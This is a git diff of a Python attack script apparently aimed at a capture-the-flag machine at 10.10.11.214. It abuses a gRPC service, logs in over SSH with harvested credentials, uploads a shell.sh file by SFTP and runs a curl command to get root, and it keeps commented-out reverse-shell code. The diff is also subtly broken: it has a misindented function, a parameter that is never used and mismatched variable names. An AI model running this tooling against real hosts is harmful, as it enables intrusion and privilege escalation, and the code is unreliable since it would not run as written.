@@ -3,6 +3,10 @@ import SimpleApp_pb2_grpc as pb2_grpc
 import SimpleApp_pb2 as pb2
 import json
 import paramiko
+import multiprocessing
+
+from revsh import Revsh
+
 
 host = "10.10.11.214"
 grpc_port = 50051
@@ -45,8 +49,18 @@ def get_user_flag():
     print(ssh_exec_command("cat user.txt"))
 
 def get_root_flag(users):
-    curl_cmd = read_curl_command()
-    ssh_exec_command(curl_cmd, users)
+    transfer_file_from_local(users)
+    exec_curl_command(users)
+    
+    
+    
+    #ssh_proc = multiprocessing.Process(target=ssh_exec_command, args=(curl_cmd, users))
+    #ssh_proc.start()
+    #ssh_proc.join()
+    
+    #revsh = Revsh()
+    #revsh_proc = multiprocessing.Process(target=revsh.send_command())
+    #revsh_proc.join(timeout=10)
 
 def make_get_id_req(token, query, stub):
     metadata = (('token',token),)
@@ -59,25 +73,40 @@ def setup_grpc():
     stub = pb2_grpc.SimpleAppStub(channel)
     
     return stub
-
-def ssh_exec_command(command, users):
+    
+def init_ssh(users):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
+    
     for user in users:
+        if user["username"] == "admin":
+            continue
+    
         try:
             client.connect(host, username=user["username"], password=user["password"])
-            ssh_stdin, ssh_stdout, ssh_stderr = client.exec_command(command)
-
-            return ssh_stdout.read().decode('utf-8')
-
+            return client
+            
         except paramiko.ssh_exception.AuthenticationException:
             continue
+    
+    return None
 
+def ssh_exec_command(command, users):
+    client = init_ssh(users)
+    ssh_stdin, ssh_stdout, ssh_stderr = client.exec_command(command)
+    client.close()
 
-def read_curl_command():
+    return ssh_stdout.read().decode('utf-8')
+    
+ def transfer_file_from_local(i):
+    client = init_ssh(users)
+    ftp_client = client.open_sftp()
+    ftp_client.put("shell.sh", "/home/sau/shell.sh")
+
+def exec_curl_command(users):
     with open("../curl.txt") as f:
-        return f.read().strip()
+        command = f.read().strip()
+    ssh_exec_command(curl_command, users)
 
 if __name__ == "__main__":
     main()
